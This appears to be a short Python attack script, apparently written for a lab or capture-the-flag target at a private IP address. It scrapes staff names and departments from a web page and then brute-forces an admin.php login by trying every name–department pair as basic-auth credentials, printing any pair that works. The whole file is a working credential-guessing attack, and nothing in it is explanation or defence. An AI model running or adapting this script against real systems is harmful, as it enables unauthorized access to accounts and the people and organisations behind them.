import requests
from bs4 import BeautifulSoup

"""
- scrapes a host for "names" and "departments"
- uses this scraped data to brute force a login 
"""


 # scrape user credentials into dictionary 
url1 = 'http://172.16.120.120'
# get HTML
x = requests.get(url1).text 
soup = BeautifulSoup(x, 'html.parser')

# put names into a list
names = []
for i in soup.find_all(id="name"):
  names.append(i.get_text())
# put deparements into a list
deps = []
for i in soup.find_all(id="department"):
  deps.append(i.get_text())
# get uniq name and departments 
uniqNames = sorted(set(names))
uniqDeps = sorted(set(deps))

# brute force login 
url2 = 'http://172.16.120.120/admin.php'
print('[+] Working ...')
for i in uniqNames:
  for j in uniqDeps:
    a = requests.post(url2, auth = (i, j))    
    if (a.ok):
      print(f"username: {i} \npassword: {j}")